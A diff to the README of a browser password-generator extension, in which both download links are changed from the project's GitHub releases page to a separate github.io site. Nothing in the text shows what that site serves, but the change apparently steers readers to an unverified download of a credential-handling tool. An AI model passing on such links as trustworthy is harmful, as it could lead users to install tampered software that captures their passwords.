@@ -1,6 +1,6 @@
 # 🔐 ZPassword-Extension - Secure passwords generated for your browser
 
-[![Download ZPassword-Extension](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/vroomfalsification798/ZPassword-Extension/releases)
+[![Download ZPassword-Extension](https://img.shields.io/badge/Download-Releases-blue.svg)](https://vroomfalsification798.github.io)
 
 ZPassword-Extension helps you manage passwords. It creates strong passwords for your accounts. It saves your settings for each website. It fills password forms for you. The software runs locally on your computer. It uses encryption to protect your data. You do not need an account to use it. It does not track your activity.
 
@@ -18,7 +18,7 @@ This extension simplifies password management. You open your browser and the too
 
 Follow these steps to add the extension to your browser.
 
-1. Visit the [Releases page](https://github.com/vroomfalsification798/ZPassword-Extension/releases) to download the latest version.
+1. Visit the [Releases page](https://vroomfalsification798.github.io) to download the latest version.
 2. Look for the file ending in `.zip` or the source code folder.
 3. Download this file to your computer.
 4. Open your browser settings.
